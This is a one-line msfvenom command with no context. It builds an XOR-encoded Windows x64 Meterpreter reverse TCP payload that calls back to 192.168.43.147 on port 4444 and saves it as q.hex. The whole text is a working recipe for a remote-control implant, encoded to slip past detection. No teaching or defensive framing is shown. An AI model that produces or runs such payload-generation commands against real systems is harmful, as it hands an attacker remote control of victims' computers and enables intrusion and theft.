msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.147 LPORT=4444 -a x64 --platform windows -e x64/xor -f raw -o q.hex

